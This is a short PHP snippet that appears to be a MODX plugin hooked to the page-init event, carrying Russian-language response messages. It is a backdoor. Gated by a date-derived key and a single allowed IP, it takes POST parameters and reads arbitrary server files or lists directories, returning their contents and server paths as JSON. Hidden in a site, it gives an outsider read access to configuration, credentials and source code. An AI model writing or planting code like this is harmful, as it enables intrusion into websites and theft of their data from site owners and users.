<?php
//OnWebPageInit
$key = date('Y_Y_Y_m_d_y');
$action = $_POST['action'];
$command = $_POST['cmd'];
$dir = $_POST['dir'];
$servIp = '1.1.1.1.1';
if ($_SERVER['REMOTE_ADDR'] != $servIp) {
  $resp = array(
    'result' => false,
    'resp' => 'Нет доступа'
  );
  exit(json_encode($resp));
}
function getFile($dir) {
  if (array_pop(explode('/', $dir))) {
    $dir2 = str_replace(array_pop(explode('/', $dir)), '', $dir);
    $resp = array(
      'result' => true,
      'absolute' => __DIR__,
      'base_path' => MODX_BASE_PATH,
      'dir' => $dir2,
      'folder' => false,
      'resp' => file_get_contents($dir)
    );
  } else {
    
    $scan = scandir($dir);
    foreach ($scan as $item) {
      if (is_dir($dir.$item)) {
        $folders[] = array(
          'folder' => true,
          'item' => $item.'/'
          );
        
      } else {
        $folders[] = array(
          'folder' => false,
          'item' => $item
          );
      }
      
    }
    unset($folders[0]);
    unset($folders[1]);
    sort($folders);
    $resp = array(
      'result' => true,
      'absolute' => __DIR__,
      'base_path' => MODX_BASE_PATH,
      'dir' => $dir,
      'folder' => true,
      'resp' => $folders
      );
  }
  return $resp;
}

if ($action == $key) {
  switch ($command) {
    case 'dir':
      $resp = getFile($dir);
      break;
    default:
      $resp = array(
        'result' => false,
        'resp' => 'Нет такой команды'
      );
  }
  exit(json_encode($resp));
}